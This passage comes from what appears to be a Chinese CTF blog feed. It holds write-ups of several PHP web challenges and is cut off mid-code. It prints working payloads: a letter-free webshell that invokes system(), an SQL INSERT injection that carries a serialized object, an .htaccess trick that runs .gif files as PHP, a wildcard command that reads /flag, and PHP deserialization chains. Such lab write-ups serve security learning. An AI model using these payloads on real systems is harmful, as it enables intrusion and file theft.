    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>GetShell</title>
    <link href="http://lll-nnn.github.io/2021/05/19/BUU87/"/>
    <id>http://lll-nnn.github.io/2021/05/19/BUU87/</id>
    <published>2021-05-19T03:35:12.000Z</published>
    <updated>2021-05-20T12:33:46.256Z</updated>
    
    <content type="html"><![CDATA[<h2 id="o-o"><a href="#o-o" class="headerlink" title="o)o"></a>o)o</h2><p>打开环境，发现是文件上传，还给了部分源码</p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d40dccf7a06348d1.png">   </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span>($contents=file_get_contents($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;    $data=substr($contents,<span class="hljs-number">5</span>);    <span class="hljs-keyword">foreach</span> ($black_char <span class="hljs-keyword">as</span> $b) &#123;        <span class="hljs-keyword">if</span> (stripos($data, $b) !== <span class="hljs-literal">false</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);        &#125;    &#125;     &#125;</code></pre></code></pre><p>从给的源码得知会检查文件的内容第六位之后   </p><p>看WP似乎是过滤了数字和字母      </p><p>可用的符号<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>       </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神的无字母数字gethell</a>   </p><p>利用中文和取反操作得到字母    </p><p><code>echo ~(&#39;北&#39;)[1];</code>–&gt;s     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);$str = <span class="hljs-string">&#x27;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;mb_strlen($str, <span class="hljs-string">&#x27;utf-8&#x27;</span>); $i++)&#123;    $st = mb_substr($str, $i,<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>);    $a = ~($st);    $b = $a[<span class="hljs-number">1</span>];<span class="hljs-comment">#取汉字的第一位</span>    <span class="hljs-keyword">if</span>($b==$_GET[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-comment">#$_GET[&#x27;a&#x27;]想要得到的字符</span>    &#123;        <span class="hljs-keyword">echo</span> $st;<span class="hljs-keyword">exit</span>;      <span class="hljs-comment">//~($st)[1]</span>    &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><a href="https://www.leavesongs.com/THINK/answer.html?page=1">P神</a>      </p><p>上面的EXP使用方法      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/608d549c7d463779.png">     </p><p>构造payload<code>&lt;?=system($_POST[system]);&gt;</code><br>先构造数字1–&gt;<code>$__=[];$____=$__==$__;</code><br>system:<code>$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];</code>       </p><p>_POST:<code>$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];</code>       </p><p><code>system($_POST[system])</code>:<code>$_($$___[$_])</code>      </p><p>最终的payload：<code>&lt;?=$__=[];$____=$__==$__;$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];$_($$___[$_]);</code>    </p><p>flag不在根目录下，在环境变量中<code>env</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/dbbe16c2fd333a78.png">     </p><p>payload:<code>eval($_POST[1])</code>就不行，原因是PHP支持<code>变量函数</code>,也就是通过一个变量保存函数名，在变量后加上<code>()</code>即可调用函数；但是<code>eval</code>并不是一个函数，是PHP语法结构的一部分。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;o-o&quot;&gt;&lt;a href=&quot;#o-o&quot; class=&quot;headerlink&quot; title=&quot;o)o&quot;&gt;&lt;/a&gt;o)o&lt;/h2&gt;&lt;p&gt;打开环境，发现是文件上传，还给了部分源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/202</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="getshell" scheme="http://lll-nnn.github.io/tags/getshell/"/>
    
    <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>不是文件上传</title>
    <link href="http://lll-nnn.github.io/2021/05/15/BUU86/"/>
    <id>http://lll-nnn.github.io/2021/05/15/BUU86/</id>
    <published>2021-05-14T16:02:50.000Z</published>
    <updated>2021-05-16T07:37:39.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>题目说不是文件上传，看一下<code>www.zip</code>   </p><p>没有？？</p><p>看了WP，是<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png">   </p><p><code>github</code>上搜索得到源码<img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png">      </p><p>主要是<code>helper.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;config.txt&quot;</span>;    <span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params">$input=<span class="hljs-string">&quot;file&quot;</span></span>)</span><span class="hljs-function">    </span>&#123;        $fileinfo = <span class="hljs-keyword">$this</span>-&gt;getfile($input);        $array = <span class="hljs-keyword">array</span>();        $array[<span class="hljs-string">&quot;title&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;title&#x27;</span>];        $array[<span class="hljs-string">&quot;filename&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;filename&#x27;</span>];        $array[<span class="hljs-string">&quot;ext&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;ext&#x27;</span>];        $array[<span class="hljs-string">&quot;path&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;path&#x27;</span>];        $img_ext = getimagesize($_FILES[$input][<span class="hljs-string">&quot;tmp_name&quot;</span>]);        $my_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;$img_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;$img_ext[<span class="hljs-number">1</span>]);        $array[<span class="hljs-string">&quot;attr&quot;</span>] = serialize($my_ext);        $id = <span class="hljs-keyword">$this</span>-&gt;save($array);        <span class="hljs-keyword">if</span> ($id == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">$input</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($input))&#123;            $rs = <span class="hljs-keyword">$this</span>-&gt;check($_FILES[$input]);        &#125;        <span class="hljs-keyword">return</span> $rs;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$info</span>)</span><span class="hljs-function">    </span>&#123;        $basename = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);        $filename = $info[<span class="hljs-string">&quot;name&quot;</span>];        $ext = substr(strrchr($filename, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);        $cate_exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);        <span class="hljs-keyword">if</span>(!in_array($ext,$cate_exts))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);        &#125;        $title = str_replace(<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;&#x27;</span>,$filename);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;$title,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;$ext,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(!$data || !is_array($data))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        $id = <span class="hljs-keyword">$this</span>-&gt;insert_array($data);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        $con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);        <span class="hljs-keyword">if</span> (mysqli_connect_errno($con))         &#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());        &#125;        $sql_fields = <span class="hljs-keyword">array</span>();        $sql_val = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;            $key_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $key);            $value_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value);            $sql_fields[] = <span class="hljs-string">&quot;`&quot;</span>.$key_temp.<span class="hljs-string">&quot;`&quot;</span>;            $sql_val[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.$value_temp.<span class="hljs-string">&quot;&#x27;&quot;</span>;        &#125;        $sql = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_fields)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_val)).<span class="hljs-string">&quot;)&quot;</span>;        mysqli_query($con, $sql);        $id = mysqli_insert_id($con);        mysqli_close($con);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params">$path</span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;            <span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>        &#125;        $content = file_get_contents($path);        <span class="hljs-keyword">echo</span> $content;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment"># Read some config html</span>        <span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>最后的这里可以利用<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png"></p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> helper();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>然后是sql <code>insert </code> 注入   </p><p>正常上传图片的sql语句为<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIM截图20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p><p>其中title没有做什么处理<br>所以构造<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>文件名不能有双引号，所以进行十六进制编码    </p><p>上传图片，用burp改一下文件名，在<code>show.php</code>得到flag     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7518b270a41d8eaa.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;__--__&quot;&gt;&lt;/a&gt;&lt;code&gt;__--__&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;题目说不是文件上传，看一下&lt;code&gt;www.zip&lt;/code&gt;   &lt;/p&gt;
&lt;p&gt;没有？？&lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Wicctf</title>
    <link href="http://lll-nnn.github.io/2021/05/11/wicctf/"/>
    <id>http://lll-nnn.github.io/2021/05/11/wicctf/</id>
    <published>2021-05-11T09:00:11.000Z</published>
    <updated>2021-05-13T15:35:36.167Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>文件上传题<br>给了源码，其中有些配置文件看不懂，放弃了   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png">     </p><p>一开始上传PHP文件，上传成功了，但访问返回了文件中的内容，应该是没有解析PHP文件     </p><p>这时候就应该找apache中的相关配置了    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png">      </p><p>这个设为了<code>off</code>会限制目录下的PHP文件没有执行权限<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png">        </p><p>通过传入<code>.htaccess</code>文件来覆盖配置文件中的设置（<code>.htaccess</code>文件作用所在的目录和所有子目录，指令按查找顺序依次生效，所以子目录下的<code>.htaccess</code>可能会覆盖父目录下或者配置文件中的指令）      </p><pre><code>&lt;Files &quot;*.gif&quot;&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpphp_flag engine on&lt;/Files&gt;</code></pre><p><code>&lt;file&gt;</code>标签比<code>&lt;directory&gt;</code>优先级高     </p><p>然后上传一句话木马，文件后缀名改为<code>.gif</code>      </p><p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png">        </p><p><a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>);     &#125;    <span class="hljs-keyword">eval</span>($code);&#125;</code></pre></code></pre><p>过滤了字母数字还有<code>_@$</code>    </p><p>试了下异或，不行；url取反也不行，就没招了…….      </p><p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p><p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png">    </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">无字母数字webshell之提高篇—P神</a></p><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png">       </p><p>停电了会发生什么    </p><p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p><p>扫到<code>.index.php.swp</code>       </p><p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;        <span class="hljs-comment">// initialise variables</span>        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);            &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);        fclose($fd);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;    <span class="hljs-keyword">public</span> $weblogfile;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);        <span class="hljs-keyword">return</span> $str;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);$log_unser = unserialize($log);<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;body&gt;&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="hljs-number">14</span>级大风停电了.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p><code>readfile</code>  、 flag在<code>/flag</code>      </p><p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p><p>flag过滤了，双写即可绕过    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> 